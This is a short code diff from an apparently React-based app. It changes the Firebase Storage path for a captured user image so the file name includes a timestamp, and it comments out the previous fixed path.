@@ -257,7 +257,9 @@ useEffect(() => {
       stream.getTracks().forEach((track) => track.stop());
 
       // ========== 2. Upload ke Firebase Storage ==========
-      const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
+     // const fileRef = storageRef(storage, `user_captures/${currentUser}_online.png`);
+      const fileRef = storageRef(storage, `user_captures/${currentUser}_online_${timestamp}.png`);
+      
       await uploadString(fileRef, imageData, "data_url");
       const downloadURL = await getDownloadURL(fileRef);
 
